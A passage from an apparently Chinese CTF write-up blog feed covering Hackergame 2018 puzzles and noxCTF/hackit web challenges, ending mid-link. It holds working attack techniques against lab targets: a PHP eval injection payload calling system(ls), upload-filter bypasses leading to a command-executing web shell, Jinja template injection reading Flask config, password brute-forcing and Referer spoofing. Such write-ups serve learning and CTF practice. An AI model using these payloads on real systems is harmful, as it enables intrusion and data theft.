title="回到过去"></a>回到过去</h3><p>利用linux的ed命令</p><blockquote><p>ed是Linux中功能最简单的文本编辑程序，一次仅能编辑一行而非全屏幕方式的操作。</p></blockquote><p><a href="https://my.oschina.net/u/2245781/blog/1813248" target="_blank" rel="noopener">Linux ed命令</a></p><p>了解之后，题目就明白什么意思了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">q</span><br><span class="line">ed</span><br><span class="line">a</span><br><span class="line">flag&#123;</span><br><span class="line">.</span><br><span class="line">a</span><br><span class="line">44a2b8</span><br><span class="line">a3d9b2c</span><br><span class="line">c44039</span><br><span class="line">f93345</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">2m3</span><br><span class="line">2m5</span><br><span class="line">2m1</span><br><span class="line">2</span><br><span class="line">s/4/t</span><br><span class="line">q</span><br><span class="line">q</span><br></pre></td></tr></table></figure><p>执行相应命令，不过我一直交不对，脚本改变其4段的顺序，暴力交了一波</p><p><code>flag{t4a2b8c44039f93345a3d9b2}</code></p><h3 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h3><p>console发现提示</p><p><img src="https://i.loli.net/2018/10/14/5bc332267a48e.png" alt="8.png"></p><p>输入得到第一个flag</p><p><code>flag{i_canN0t_BReW_c0ffEE!}</code></p><p>跟着链接到第二关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Brewing tea is not so easy.</span><br><span class="line"></span><br><span class="line">Try using other methods to request this page.</span><br></pre></td></tr></table></figure><p>改post请求提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;The method &quot;POST&quot; is deprecated.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;See RFC-7168 for more information.&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这里涉及到<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E5%92%96%E5%95%A1%E5%A3%B6%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">超文本咖啡壶控制协议</a></p><blockquote><p>超文本咖啡壶控制协议（英语：Hyper Text Coffee Pot Control Protocol，缩写HTCPCP）是由IETF虚构的一种协议。这个协议在文档RFC 2324[1]（1998年4月1日发布）中定义，是一个恶搞RFC。</p></blockquote><blockquote><p>该协议被设计为一个类似HTTP的协议，可以用于控制、监测和诊断咖啡壶，后来也被拓展到茶壶；该协议有时也可以视作一种早期的物联网实验。</p></blockquote><p>在<a href="https://tools.ietf.org/html/rfc7168" target="_blank" rel="noopener">RFC 7168</a>这个页面中搜寻信息发现BREW请求方法以及Content-Type头</p><p><img src="https://i.loli.net/2018/10/14/5bc3374e70fe9.png" alt="9.png"></p><p>根据提示将message/coffeepot的coffeepot改为teapot，从response的Alternates得知新路径</p><p><img src="https://i.loli.net/2018/10/14/5bc332262fff7.png" alt="2.png"></p><p>访问得到flag</p><p><img src="https://i.loli.net/2018/10/14/5bc332267abab.png" alt="3.png"></p><h3 id="秘籍残篇"><a href="#秘籍残篇" class="headerlink" title="秘籍残篇"></a>秘籍残篇</h3><p>第一关：</p><p>将得到的文本缩到最小，自动换行，调整窗口大小得到flxg，这里是flxg</p><p><img src="https://i.loli.net/2018/10/14/5bc34437990fe.png" alt="4.png"></p><h3 id="猫咪遥控器"><a href="#猫咪遥控器" class="headerlink" title="猫咪遥控器"></a>猫咪遥控器</h3><p><img src="https://i.loli.net/2018/10/14/5bc32f7d5d1f3.png" alt="7.png"></p><p>根据题意猜测表示移动方向，通过脚本画图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line"></span><br><span class="line">from PIL import Image,ImageDraw</span><br><span class="line"></span><br><span class="line">seq = open(&apos;seq2.txt&apos;,&apos;rb&apos;)</span><br><span class="line"></span><br><span class="line">newIm= Image.new(&apos;RGB&apos;, (2000, 1000), &apos;white&apos;)</span><br><span class="line">newIm.save(&apos;newimg.png&apos;)</span><br><span class="line"></span><br><span class="line">newimg = Image.open(&apos;newimg.png&apos;)</span><br><span class="line"></span><br><span class="line">drawimg = ImageDraw.Draw(newimg)</span><br><span class="line"></span><br><span class="line">x = 500</span><br><span class="line">y = 500</span><br><span class="line"></span><br><span class="line">for i in seq.read():</span><br><span class="line">if i == &apos;D&apos;:</span><br><span class="line">y = y + 1</span><br><span class="line">drawimg.point((x,y),fill=(0,0,0))</span><br><span class="line">if i == &apos;U&apos;:</span><br><span class="line">y = y - 1</span><br><span class="line">drawimg.point((x,y),fill=(0,0,0))</span><br><span class="line">if i == &apos;L&apos;:</span><br><span class="line">x = x - 1</span><br><span class="line">drawimg.point((x,y),fill=(0,0,0))</span><br><span class="line">if i == &apos;R&apos;:</span><br><span class="line">x = x + 1</span><br><span class="line">drawimg.point((x,y),fill=(0,0,0))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newimg.save(&apos;newimg.png&apos;)</span><br><span class="line">newimg.close()</span><br><span class="line">seq.close()</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://i.loli.net/2018/10/14/5bc32fb7c2133.png" alt="newimg.png"></p><h3 id="她的诗"><a href="#她的诗" class="headerlink" title="她的诗"></a>她的诗</h3><p>题目自带py解出没有flag，但能看出是uudecode，google解密网站</p><p>解密得到</p><p><img src="https://i.loli.net/2018/10/14/5bc341157ba0f.png" alt="10.png"></p><p>拼出flag即可</p><p><code>flag{STegAn0grAPhy_w1tH_uUeNc0DE_I5_50_fun}</code></p><h3 id="猫咪克星"><a href="#猫咪克星" class="headerlink" title="猫咪克星"></a>猫咪克星</h3><p><code>nc 202.38.95.46 12009</code>连接，计算各种表达式</p><p>有时间限制，需要脚本跑一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">HOST = &apos;202.38.95.46&apos;</span><br><span class="line">PORT = 12009</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">s.recv(1024)</span><br><span class="line">while True:</span><br><span class="line">re = str(s.recv(1024))</span><br><span class="line">print re</span><br><span class="line">re = re.replace(&quot;__import__(&apos;time&apos;).sleep(100)&quot;,&quot;0&quot;).replace(&quot;exit()&quot;,&quot;0&quot;).replace(&quot;__import__(&apos;os&apos;).system(&apos;find ~&apos;)&quot;,&quot;0&quot;).replace(&quot;print(&apos;\\x1b\\x5b\\x33\\x3b\\x4a\\x1b\\x5b\\x48\\x1b\\x5b\\x32\\x4a&apos;)&quot;,&quot;0&quot;)</span><br><span class="line">print re</span><br><span class="line">data = eval(re)</span><br><span class="line">print str(data)</span><br><span class="line">s.send(str(data)+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">    #s.close()</span><br></pre></td></tr></table></figure><p>flag: </p><p><code>flag{&#39;Life_1s_sh0rt_use_PYTH0N&#39;*1000}</code></p><h3 id="喵咪电路"><a href="#喵咪电路" class="headerlink" title="喵咪电路"></a>喵咪电路</h3><blockquote><p>技术上来说，我们通过 Minecraft (版本：1.12.2) 存档提供了一个 40 个输入的红石电路，他们共同影响着信标的颜色，如果你通过调整输入，成功使得信标变绿，说明你已经破解了这个电路，请以 flag{1010101010100010…0101010} 的格式提交你的答案（1 代表激活，0 代表不激活）。</p></blockquote><p>下载存档进行游戏，掌握基本逻辑电路知识即可</p><p>内有教程，玩就行了</p><p><img src="https://i.loli.net/2018/10/14/5bc33f9c9ad16.jpg" alt="6FF17292DE2B71989FB7183BC82716D0.jpg"></p><p>懒得再进游戏，flag就不写了</p><p>挺有意思的比赛</p><p>官方wp: <a href="https://github.com/ustclug/hackergame2018-writeups" target="_blank" rel="noopener">https://github.com/ustclug/hackergame2018-writeups</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前两题不写了。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>部分 noxCTF &amp; hackitctf WriteUp</title>
    <link href="http://j0k3r.top/2018/09/26/ctfs_18_9/"/>
    <id>http://j0k3r.top/2018/09/26/ctfs_18_9/</id>
    <published>2018-09-25T16:00:00.000Z</published>
    <updated>2019-04-22T11:53:23.405Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h1 id="123"><a href="#123" class="headerlink" title="123"></a>123</h1><p>源码提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 用户信息都在user.php里 --&gt;</span><br><span class="line">&lt;!-- 用户默认默认密码为用户名+出生日期 例如:zhangwei1999 --&gt;</span><br></pre></td></tr></table></figure><p>user.php空白，user.php.bak内容含很多用户名，可用来爆破，扫描得到的flag.php并没有flag</p><p>选burp的attack type为pitchfork，set两个payload爆破<br>得到用户和密码</p><p><img src="https://i.loli.net/2018/09/02/5b8bacfc8afb6.png" alt="ks1.png"></p><p>源码提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 存在漏洞需要去掉  --&gt;</span><br><span class="line">&lt;!-- &lt;form action=&quot;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;</span><br><span class="line">&lt;/form&gt; --&gt;</span><br></pre></td></tr></table></figure><p>去掉注释，补上action，上传文件</p><p>phmtl后缀绕过</p><p>得到：<br><code>&lt;a href=&quot;/view.php&quot;&gt;view&lt;/a&gt;</code></p><p>view.php提示file，传入file参数又提示filter “flag”，过滤了flag</p><p>双写绕过</p><p><code>http://9df2aa756fb048e7b0df80c187e5d350b037754437604bc6.game.ichunqiu.com/view.php?file=flflagag</code></p><p><code>flag{d0b2de22-fe4d-48ee-a447-f010dc83c087}</code></p><h1 id="https-shrimphp-herokuapp-com-F0-9F-8D-A4-22-system-ls-22"><a href="#https-shrimphp-herokuapp-com-F0-9F-8D-A4-22-system-ls-22" class="headerlink" title="https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22"></a><a href="https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22" target="_blank" rel="noopener">https://shrimphp.herokuapp.com/?%F0%9F%8D%A4=%22.system(ls).%22</a></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// flag&#123;thisisnotflag&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$_ = $_GET[&apos;🍤&apos;];</span><br><span class="line">//$_ = &apos;&quot;.system(ls).&quot;&apos;;</span><br><span class="line">if( strpos($_, &apos;&quot;&apos;) || strpos($_, &quot;&apos;&quot;) || strpos($_, &quot;_&quot;) || strpos($_, &quot;[&quot;) || strpos($_, &quot;$&quot;) ) </span><br><span class="line">    die(&apos;What did you do?????&apos;);</span><br><span class="line"></span><br><span class="line">eval(&apos;die(&quot;&apos; . substr($_, 0, 16) . &apos;&quot;);&apos;);</span><br><span class="line">echo &apos;Try harder!!!!&apos;;</span><br></pre></td></tr></table></figure><p><code>?🍤=&quot;.system(ls).&quot;</code></p><p><code>flag{php_is_good_for_hackers!!!!}</code></p><h1 id="Web-Book"><a href="#Web-Book" class="headerlink" title="Web Book"></a>Web Book</h1><p>link to Web_BooK:<a href="http://34.216.132.109:8083/fp/" target="_blank" rel="noopener">http://34.216.132.109:8083/fp/</a></p><p>只能不停点击next，用脚本模拟</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://34.216.132.109:8083'</span></span><br><span class="line">get = <span class="string">'/fp/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = s.get(url+get)</span><br><span class="line">    h = r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> h:</span><br><span class="line">        <span class="keyword">print</span> h</span><br><span class="line">        exit</span><br><span class="line">    get = re.findall(<span class="string">'&lt;form action="(.*?)" method="get"&gt;'</span>,h)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*] try '</span>+get</span><br></pre></td></tr></table></figure><p>最终得到flag</p><p><img src="https://i.loli.net/2018/09/04/5b8e2f61b0d14.png" alt="ks2.png"></p><h1 id="Shrine"><a href="#Shrine" class="headerlink" title="Shrine"></a>Shrine</h1><p>题目给出源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>flag是一个特定的配置值，/shrine/后面存在模版注入，过滤了<code>（）</code>，添加了黑名单，无法通过来读取配置值，也不能用获取对象的属性值</p><p>然后通过拜读wp知道，为了获得配置信息，需要从它的上全局变量(current_app等)访问config。</p><p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]</span><br><span class="line"></span><br><span class="line">top.app.config[&apos;FLAG&apos;]</span><br></pre></td></tr></table></figure></p><p>所有的函数都会有一个<strong>globals</strong>属性,它会以一个dict，返回函数所在模块命名空间中的所有变量</p><p>一些方法：</p><ol><li>url_for函数</li></ol><p><code></code>找到<code>current_app</code></p><p>读取flag<code></code></p><ol start="2"><li>get_flashed_messages函数</li></ol><p><code></code>找到<code>current_app</code></p><p>读取flag<code></code></p><ol start="3"><li>request</li></ol><p><code></code></p><p>noxCTF</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>What is your reference again?</p><p><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p><p>页面显示where the <em>**</em> did you come from?，根据题意要添加Referer头</p><p>根据index.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">"check_from_google"</span>,</span><br><span class="line">        data: <span class="literal">NaN</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#status"</span>).html(<span class="string">"hello old friend! "</span> + atob(result))        </span><br><span class="line">        &#125;,</span><br><span class="line">        dataType: <span class="literal">NaN</span></span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="string">"#status"</span>).html(<span class="string">"where the **** did you come from?"</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/09/07/5b922f41c605f.png" alt="ks3.png"></p><p>应该在<code>http://chal.noxale.com:5000/check_from_google</code>判断是否来自google</p><p><code>curl -H &quot;Referer: https://www.google.com/&quot; http://chal.noxale.com:5000/check_from_google</code></p><p>得到base64，解码得到flag</p><p><code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p><h1 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h1><p>This is my new file uploader server. I bet you can’t hack it!</p><p><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p><p>开始是文件上传，抓包</p><p>发现总会删除最后的<code>.php</code>,且必须包含<code>.jpg</code>等图片后缀，于是用<code>.jpg.php.php</code>成功上传</p><p><img src="https://i.loli.net/2018/09/07/5b9244520037e.png" alt="ks5.png"></p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;My file uploading website!&lt;/title&gt;</span><br><span class="line">      &lt;meta name = <span class="string">"viewport"</span> content = <span class="string">"width = device-width, initial-scale = 1"</span>&gt;      </span><br><span class="line">      &lt;link rel = <span class="string">"stylesheet"</span></span><br><span class="line">         href = <span class="string">"https://fonts.googleapis.com/icon?family=Material+Icons"</span>&gt;</span><br><span class="line">      &lt;link rel = <span class="string">"stylesheet"</span></span><br><span class="line">         href = <span class="string">"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.3/css/materialize.min.css"</span>&gt;</span><br><span class="line">      &lt;script type = <span class="string">"text/javascript"</span></span><br><span class="line">         src = <span class="string">"https://code.jquery.com/jquery-2.1.1.min.js"</span>&gt;&lt;/script&gt;           </span><br><span class="line">      &lt;script src = <span class="string">"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.3/js/materialize.min.js"</span>&gt;</span><br><span class="line">      &lt;/script&gt; </span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;body class = "container"&gt;  </span><br><span class="line">    &lt;h5&gt; It is the most secure uploading server in the world! &lt;br&gt;&lt;/h5&gt; </span><br><span class="line">      &lt;div class = "row"&gt;</span><br><span class="line">         &lt;form enctype="multipart/form-data" class = "col s6 push-s3" method="POST" action=''&gt;</span><br><span class="line">            &lt;div class = "row"&gt;</span><br><span class="line">               &lt;div class = "file-field input-field"&gt;</span><br><span class="line">                  &lt;div class = "btn"&gt;</span><br><span class="line">                     &lt;span&gt;Browse&lt;/span&gt;</span><br><span class="line">                     &lt;input type = <span class="string">"file"</span> name=<span class="string">"upload"</span>/&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                  </span><br><span class="line">                  &lt;div class = "file-path-wrapper"&gt;</span><br><span class="line">                     &lt;input class = "file-path validate" type = "text"</span><br><span class="line">                        placeholder = <span class="string">"Upload file"</span> /&gt;</span><br><span class="line"></span><br><span class="line">                  &lt;button class="btn waves-effect waves-light" type="submit" name="action"&gt;Submit</span><br><span class="line">                    &lt;i class="material-icons right"&gt;send&lt;/i&gt;</span><br><span class="line">                  &lt;/button&gt;</span><br><span class="line">        </span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                  &lt;p style="text-align:center" class="col push-s3"&gt;</span><br><span class="line">                    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]))</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span>($_FILES[<span class="string">"upload"</span>][<span class="string">"error"</span>] != <span class="number">0</span>) <span class="keyword">die</span>(<span class="string">"Problem occured with file upload"</span>);</span><br><span class="line">                      $target_path = <span class="string">"uploads"</span>;</span><br><span class="line">                      $file_name = $_FILES[<span class="string">"upload"</span>][<span class="string">'name'</span>];</span><br><span class="line">                      $file_type = $_FILES[<span class="string">"upload"</span>][<span class="string">'type'</span>];</span><br><span class="line">                      $file_name = preg_replace(<span class="string">"/(\.php$|\.html$)/i"</span>, <span class="string">""</span>, $file_name);</span><br><span class="line">                      </span><br><span class="line">                      <span class="keyword">echo</span> <span class="string">"File: "</span> . $file_name . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                      <span class="keyword">if</span>(preg_match(<span class="string">"/(.jpg|.png|.gif)/i"</span>, $file_name))</span><br><span class="line">                      &#123;</span><br><span class="line">                        move_uploaded_file($_FILES[<span class="string">'upload'</span>][<span class="string">'tmp_name'</span>], <span class="string">"&#123;$target_path&#125;/&#123;$file_name&#125;"</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"Image uploaded to: &lt;a href='&#123;$target_path&#125;/&#123;$file_name&#125;'&gt;Here&lt;/a&gt; &lt;br&gt;"</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"There is no .png/.jpg/.gif in that file name"</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                  &lt;/p&gt;</span><br><span class="line">               &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">         &lt;/form&gt;       </span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">   &lt;/body&gt;   </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>不过菜刀连接返回500，直接传一个执行命令的php，却怎么也找不到flag在哪，uploads目录下可能含flag的文件，7H3-FL4G-1S-H3r3，flag.txt等无权限访问，应该是做了权限处理</p><p><code>../.htaccess</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Options +Indexes</span><br><span class="line">AddType application/x-httpd-php .cyb3r</span><br><span class="line"></span><br><span class="line">&lt;files flag.txt&gt;</span><br><span class="line">order allow,deny</span><br><span class="line">deny from allow</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;Dockerfile&quot;&gt;</span><br><span class="line">Order deny,allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;apache2.conf&quot;&gt;</span><br><span class="line">Order deny,allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line">&lt;files &quot;.htaccess&quot;&gt;</span><br><span class="line">Order deny,allow</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/files&gt;</span><br><span class="line"></span><br><span class="line">IndexIgnore *php *pht *txt *png *jpg *gif *cyb3r *php* *Cyb3r</span><br></pre></td></tr></table></figure><p>然后不知道怎么办了，在uploads下弄了个.htaccess，然后访问uploads就Internal Server Error，可能被我弄坏了吧</p><p>过了几个小时又好了，应该是管理员重置了题目，这次uploads下文件较少，flag应该就在7H3-FL4G-1S-H3r3里，但仍don’t have permission to access /uploads/7H3-FL4G-1S-H3r3</p><p>最后ls -l查看权限时出了flag</p><p><img src="https://i.loli.net/2018/09/07/5b92707d227bf.png" alt="ks6.png"></p><h1 id="Marcode"><a href="#Marcode" class="headerlink" title="Marcode"></a>Marcode</h1><p>Marcode (Mr. Code in Hebrew), Ineed your help!<br>I got a movie but I cant see it. It hypnotizes me.<br>please help me!<br>yours,<br>Gveretcode (Mrs. Code in Hebrew)</p><p>P.S.<br>change NOXCTF to noxCTF.<br><a href="https://drive.google.com/open?id=1GkalBntU1s6d_sw_S5I4GinD8hBrh-C-" target="_blank" 